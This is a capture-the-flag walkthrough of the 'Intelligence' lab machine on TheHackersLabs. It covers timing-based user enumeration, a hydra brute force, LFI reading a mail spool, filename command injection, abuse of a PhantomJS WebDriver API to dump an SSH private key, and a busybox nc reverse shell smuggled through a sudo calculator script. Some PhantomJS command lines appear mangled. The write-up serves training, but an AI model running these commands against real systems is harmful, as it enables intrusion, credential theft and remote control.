---
title: "TheHackersLabs Intelligence Writeup"
date: 2026-04-20 14:00:00 +0000
categories: [TheHackersLabs, Writeups]
tags: [thehackerslabs, ctf, phantomjs, lfi, user-enumeration, bash-injection]
description: "A professional analysis of the Intelligence machine, focusing on time-based user enumeration, LFI mail exfiltration, and PhantomJS exploitation."
image:
  path: /assets/img/posts/thehackerslabs/intelligence/intelligence.png
---

The **Intelligence** machine on TheHackersLabs platform is an engaging challenge that requires a mix of web application testing and system exploitation. The journey to root involves uncovering a timing side-channel for user enumeration, exploiting Local File Inclusion (LFI) to exfiltrate internal credentials, and leveraging an insecure PhantomJS instance for lateral movement. The final ascent to root involves a clever Bash injection and a standard `sudo` misconfiguration.

## Enumeration

We start our engagement by discovering active services on the target system using `nmap`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 192.168.254.242
[sudo] password for suraxddq: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 22:03 +0200
Initiating ARP Ping Scan at 22:03
Scanning 192.168.254.242 [1 port]
Completed ARP Ping Scan at 22:03, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:03
Scanning 192.168.254.242 [65535 ports]
Discovered open port 22/tcp on 192.168.254.242
Discovered open port 80/tcp on 192.168.254.242
Completed SYN Stealth Scan at 22:03, 0.73s elapsed (65535 total ports)
Nmap scan report for 192.168.254.242
Host is up, received arp-response (0.00027s latency).
Scanned at 2026-04-19 22:03:58 CEST for 1s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:87:DD:F7 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
           Raw packets sent: 65537 (2.884MB) | Rcvd: 65535 (2.621MB)
```
<br>

The initial scan reveals two open ports: **22 (SSH)** and **80 (HTTP)**. We follow up with a service version and script scan to finger-print the running applications.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nmap -sCV -p22,80 192.168.254.242                               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 22:04 +0200
Nmap scan report for intelligence.thl (192.168.254.242)
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.64
|_http-title: Intelligence Agency
|_http-server-header: Apache/2.4.64 (Ubuntu)
MAC Address: 08:00:27:87:DD:F7 (Oracle VirtualBox virtual NIC)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```
<br>

The web server is running **Apache 2.4.64** on Ubuntu. We begin our web-based exploration by visiting the site.
![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419220535.png)


Upon inspecting the landing page, we find a professional interface for an "Intelligence Agency". Notably, a contact email `d4redevil@intelligence.thl` is visible at the bottom of the page, providing us with a potential username format for the target network.

<br>
We then proceed with directory enumeration to find hidden administrative panels or configuration files.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ dirsearch -u http://intelligence.thl

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/suraxddq/reports/http_intelligence.thl/_26-04-19_22-05-50.txt

Target: http://intelligence.thl/

[22:05:50] Starting: 
[22:05:50] 403 -  281B  - /.ht_wsr.txt                                      
[22:05:51] 403 -  281B  - /.htaccess.bak1                                   
[22:05:51] 403 -  281B  - /.htaccess.orig                                   
[22:05:51] 403 -  281B  - /.htaccess.sample
[22:05:51] 403 -  281B  - /.htaccess.save
[22:05:51] 403 -  281B  - /.htaccess_orig
[22:05:51] 403 -  281B  - /.htaccess_extra                                  
[22:05:51] 403 -  281B  - /.htaccess_sc
[22:05:51] 403 -  281B  - /.htaccessBAK
[22:05:51] 403 -  281B  - /.htaccessOLD
[22:05:51] 403 -  281B  - /.htaccessOLD2
[22:05:51] 403 -  281B  - /.htm                                             
[22:05:51] 403 -  281B  - /.html
[22:05:51] 403 -  281B  - /.htpasswd_test                                   
[22:05:51] 403 -  281B  - /.htpasswds                                       
[22:05:51] 403 -  281B  - /.httr-oauth
[22:05:51] 403 -  281B  - /.php                                             
[22:05:59] 302 -    0B  - /dashboard.php  ->  login.php                     
[22:06:05] 200 -  656B  - /login.php                                        
[22:06:05] 302 -    0B  - /logout.php  ->  login.php                        
[22:06:12] 403 -  281B  - /server-status                                    
[22:06:12] 403 -  281B  - /server-status/                                   
                                                                             
Task Completed
```
<br>

The `dirsearch` results highlight two interesting endpoints: `/login.php` and `/dashboard.php`. We also perform a virtual host (vhost) discovery to see if there are any other services hosted on the same IP.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://intelligence.thl -H 'Host:FUZZ.intelligence.thl' -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.thl
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.intelligence.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

old                     [Status: 200, Size: 1929, Words: 470, Lines: 48, Duration: 191ms]
```
<br>

A new subdomain `old.intelligence.thl` is identified. Exploring the site further, we analyze the behavior of the login panel.
![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419220929.png)


## Initial Access

### Time-Based User Enumeration

While testing the login panel, we observed a significant timing difference in the server's response when submitting different usernames.

- **Legit User (`d4redevil`)**: The response takes approximately **226ms**.
- **Invalid User (`fake`)**: The response is almost instantaneous (**~1ms**).

This timing side-channel confirms that the application validates the username before verifying the password. We can use this to enumerate valid users on the system.


```bash
┌──(suraxddq㉿kali)-[~]
└─$ echo $(curl -X POST "http://intelligence.thl/login.php" -d "username=d4redevil&password=123" -o /dev/null -s  -w "%{time_total}" 2>/dev/null)
0.226059
```

<br>
But if the user doesnt exist



```bash
┌──(suraxddq㉿kali)-[~]
└─$ echo $(curl -X POST "http://intelligence.thl/login.php" -d "username=fake&password=123" -o /dev/null -s  -w "%{time_total}" 2>/dev/null)
0.001311
```
<br>
We can automate this process with a simple Bash script to test a list of usernames against the login.php endpoint.

To create the list, a scraping has been done of TheHackerLabs ranking and a list has been created with the first 200 users.
```bash
#!/bin/bash

USERS_FILE="users"
URL="http://intelligence.thl/login.php"
PASSWORD="test123"


echo -e "[+] Trying from file: $USERS_FILE${NC}"
echo -e "[+] URL: $URL${NC}"
echo ""


while IFS= read -r user; do

    [ -z "$user" ] && continue
    

    TIME=$(curl -X POST "$URL" \
        -d "username=$user&password=$PASSWORD" \
        -o /dev/null \
        -s \
        -w "%{time_total}" 2>/dev/null)
    
    if (( $(echo "$TIME > 0.2" | bc -l) )); then
        echo -e "[+] user found: $user${NC} - time: ${TIME}s"
        SLOW=$((SLOW + 1))
    fi

    
done < "$USERS_FILE"
```

```bash
┌──(suraxddq㉿kali)-[~]
└─$ bash go.sh
[+] Trying from file: users
[+] URL: http://intelligence.thl/login.php

[+] user found: d4redevil - time: 0.228548s
[+] user found: MeTaN01a - time: 0.226155s
```

<br>
The scan successfully identifies two valid users: `d4redevil` and `MeTaN01a`. Having identified valid targets, we proceed to attempt a password brute-force on the `MeTaN01a` account.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ hydra -l metan01a -P ~/CTF/first5k intelligence.thl http-post-form "/login.php:username=^USER^&password=^PASS^:F=Nom d'utilisateur ou mot de passe incorrect." -VI -t64 -f
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-11 19:10:11
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5000 login tries (l:1/p:5000), ~79 tries per task
[DATA] attacking http-post-form://intelligence.thl:80/login.php:username=^USER^&password=^PASS^:F=Nom d'utilisateur ou mot de passe incorrect.
[80][http-post-form] host: intelligence.thl   login: metan01a   password: 1a2b3c4d
[STATUS] attack finished for intelligence.thl (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-11 19:28:04
```
<br>

Hydra successfully finds a valid password for `MeTaN01a`.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419222641.png)

<br>
Logging in as `MeTaN01a`, we are greeted with a notification regarding a "promotion" and access to a new secure subdomain: `vulnday0.intelligence.thl`.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419222716.png)

<br>
Upon visiting the new subdomain, we discover a Local File Inclusion (LFI) vulnerability in the `page` parameter of `index.php`. This allows us to read sensitive system files like `/etc/passwd`.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419223356.png)

<br>
We can leverage this LFI to explore other system files. By checking the internal mail spool at `/var/mail/metan01a`, we find a message containing sensitive credentials for the internal network.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419223336.png)

### Foothold via Command Injection

With the credentials `metan01a : 0p3r4t1on_Bl4ckout!`, we can log in to the newly discovered `vulnday0.intelligence.thl` subdomain. Inside, we find a **Metadata Deep Analysis** tool that allows users to upload files for forensic scanning.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419223440.png)

<br>
Upon testing the upload functionality, we discover that the `filename` parameter in the `POST` request is vulnerable to **Command Injection**. By appending a semicolon followed by a Linux command (e.g., `1;id`), we can execute arbitrary commands on the server as the `www-data` user.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419224439.png)

<br>
We can leverage this vulnerability to obtain a full reverse shell. By injecting a base64-encoded bash reverse shell into the filename, we successfully bypass common character filters and gain a foothold on the target system.

![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419225214.png)

## Lateral movement

After gaining a preliminary foothold as `www-data` (likely via the portal or LFI), we performed an internal process audit and found a suspicious service running as the user `suraxddq`.
![](/assets/img/posts/thehackerslabs/intelligence/Pasted_image_20260419223409.png)

The process list shows **PhantomJS** running with a WebDriver interface on `127.0.0.1:8080`. PhantomJS's GhostDriver is susceptible to arbitrary Javascript execution through its API.

<br>
### Exploiting PhantomJS (GhostDriver)

We begin by identifying the unique process running as the user `suraxddq`. The output confirms that PhantomJS is active and listening for WebDriver connections.

```bash
www-data@TheHackersLabs-Intelligence:/var/www/vulnday0$ ps faux |grep sura
suraxddq     663  0.0  2.3 1780488 40084 ?       Ssl  20:15   0:00 /usr/local/bin/phantomjs --cookies-file=/tmp/tmpmwImDY --webdriver=127.0.0.1:8080
www-data    1460  0.0  0.1   3844  1984 pts/0    S+   20:53   0:00  |                           \_ grep sura
```

<br>
To interact with the service, we first need to initialize a new WebDriver session.

```bash
www-data@TheHackersLabs-Intelligence:/var/www/vulnday0$ curl -sX POST "http://127.0.0.1:8080/session"   -H "Content-Type: application/json"   -d '{"desiredCapabilities": {"browserName": "phantomjs"}}'|jq;echo
{
  "sessionId": "ea018bf0-3c31-11f1-af14-1b65408dc2ca",
  "status": 0,
  "value": {
    "browserName": "phantomjs",
    "version": "2.1.1",
    "driverName": "ghostdriver",
    "driverVersion": "1.2.0",
    "platform": "linux-unknown-64bit",
    "javascriptEnabled": true,
    "takesScreenshot": true,
    "handlesAlerts": false,
    "databaseEnabled": false,
    "locationContextEnabled": false,
    "applicationCacheEnabled": false,
    "browserConnectionEnabled": false,
    "cssSelectorsEnabled": true,
    "webStorageEnabled": false,
    "rotatable": false,
    "acceptSslCerts": false,
    "nativeEvents": true,
    "proxy": {
      "proxyType": "direct"
    }
  }
}
```
<br>

Once the session is established, we can use the `phantom/execute` endpoint to run arbitrary JavaScript. We leverage the `fs` module and the `return` statement to list the contents of the `.ssh` directory.

```bash
www-data@TheHackersLabs-Intelligence:/var/www/vulnday0$ curl -sX POST http://127.0.0.1:8080/session/ea018bf0-3c31-11f1-af14-1b65408dc2ca/phantom/execute -H "Content-Type: application/json" -d '{"script":"var fs = require(\"fs\"); returnme/suraxddq/.ssh\");","args":[]}'|jq;echo
{
  "sessionId": "ea018bf0-3c31-11f1-af14-1b65408dc2ca",
  "status": 0,
  "value": [
    ".",
    "..",
    "authorized_keys",
    "id_rsa",
    "id_rsa.pub",
    "known_hosts"
  ]
}
```
<br>

The listing confirms the presence of an `id_rsa` file. We then execute another script to read the contents of this private key.

```bash
www-data@TheHackersLabs-Intelligence:/var/www/vulnday0$ curl -sX POST http://127.0.0.1:8080/session/ea018bf0-3c31-11f1-af14-1b65408dc2ca/phantom/execute -H "Content-Type: application/json" -d '{"script":"var fs = require(\"fs\"); returnme/suraxddq/.ssh/id_rsa\");","args":[]}' | jq -r .value
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDX2fp3wM
SBQ2GKdT2J+w36AAAAGAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQD2KaJKrtxv
DB2MVgyp0/fvnGgymk3R9out+LcpM7mLyoOH9eg0PKtYBr+/ucHzlJ1Br/r/oOcmBR6Vtt
NlJue4c/7AlDyEy5NlrHwzFFQYIm/P1HO4/6KxlaaoQB6Zg/5H5NwWkPJjjXn/qbUoyS0O
w0xrXkEKyEuyxzgAvQ7kwUrSY8ZaZ6Wat82+ETpPHWo7Q5wTvkcrRTnCWX3tL1IwgAsU3q
v6CscN63+chDQsbZKIStzvOqlzZcsF1QfRx8tnxeq0C0y3oNinciE4ZLZSQFjwHASZzEGS
1ChIfBvxI9eayConjMOGHjM1keV1Eqa+bz1UseqOxLUNE9JToczV7vD5aTygDZ62+3QMSY
AO/g8G60XBsd7ve/4vOXNfC5NLA9GGkjp4w+CUlYB92flgYQZeWbyl2O0GDaCu0K6BPToT
/n75AalgzVN3fCSh3sgCm49Zt7XtJ6kSrPV93OOZ8Kmud2GkTL8VM4Td8DfYENTBNfbMqj
YTXcNug4IRvAXNhT2EwVLxEro=
-----END OPENSSH PRIVATE KEY-----
```
<br>

The exfiltrated private key is encrypted. We save it locally and use `john the ripper` to crack its passphrase.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ john --wordlist=~/CTF/first5k hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
felicidade       (id_rsa_sura)     
1g 0:00:01:23 DONE (2026-04-12 10:10) 0.01194g/s 58.48p/s 58.48c/s 58.48C/s 2222222..asasas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<br>

With the cracked passphrase `felicidade`, we can now log in to the machine via SSH as `suraxddq`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ssh -i id_rsa_sura suraxddq@192.168.254.242   
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-20-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 * Due to a now-resolved bug in the date command, this system may be unable
   to automatically check for updates. Manually install the update using:

     sudo apt install --update rust-coreutils

   https://discourse.ubuntu.com/t/enabling-updates-on-ubuntu-25-10-systems/

Last login: Sun Apr  5 14:34:26 2026 from 10.0.2.15
suraxddq@TheHackersLabs-Intelligence:~$
```
<br>

## Privilege Escalation

### Lateral Movement to wvverez

A check of our current user's `sudo` privileges reveal a path to another user, `wvverez`.

```bash
suraxddq@TheHackersLabs-Intelligence:~$ sudo -l
User suraxddq may run the following commands on TheHackersLabs-Intelligence:
    (wvverez) NOPASSWD: /opt/script.sh
```
<br>

The script `/opt/script.sh` is a custom calculator that appears to evaluate input in a way that is vulnerable to Command Injection. Specifically, it uses Bash arithmetic expansion which can be exploited if the input is not sanitized.

```bash
suraxddq@TheHackersLabs-Intelligence:~$ sudo -u wvverez /opt/script.sh 'PATH' '1'
--- VulnDay0 Elite Calculator ---
/opt/script.sh: line 37: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: syntax error: operand expected (error token is "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin")
Result: 
```


```bash
suraxddq@TheHackersLabs-Intelligence:~$ export payload='a[$(busybox nc 192.168.254.239 4444 -e /bin/bash)]'
suraxddq@TheHackersLabs-Intelligence:~$ sudo -u wvverez /opt/script.sh 'payload' '1'
--- VulnDay0 Elite Calculator ---
/bin/bash: line 1: i: command not found
```
<br>

By exporting a payload that includes a reverse shell command within an arithmetic expression, we can trick the script into executing our code as `wvverez`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nc -nvlp 4444ñ
listening on [any] 4444 ...
connect to [192.168.254.239] from (UNKNOWN) [192.168.254.242] 44842
id
uid=1001(wvverez) gid=1001(wvverez) groups=1001(wvverez),100(users)
```
<br>

We successfully intercept the reverse shell and retrieve the user flag for `wvverez`.

```bash
wvverez@TheHackersLabs-Intelligence:/home/wvverez$ cat user.txt 
THL{I****5QW22IK}
```
<br>

### Escalation to Root

As `wvverez`, we check our `sudo` permissions once more and find a direct path to root via `xargs`.

```bash
wvverez@TheHackersLabs-Intelligence:~$ sudo -l
User wvverez may run the following commands on TheHackersLabs-Intelligence:
    (ALL) NOPASSWD: /usr/bin/xargs
```


`xargs` is a powerful tool that, when run with `sudo`, can be used to execute arbitrary commands as root. We use it to spawn a root bash shell.

```bash
wvverez@TheHackersLabs-Intelligence:~$ sudo xargs -a /dev/null /bin/bash
root@TheHackersLabs-Intelligence:~# cd /root/
root@TheHackersLabs-Intelligence:/root# ls
root.txt
```
<br>

With root access, we can now read the final flag and complete the machine.

```bash
root@TheHackersLabs-Intelligence:/root# cat root.txt 
THL{NR****MKLA}
```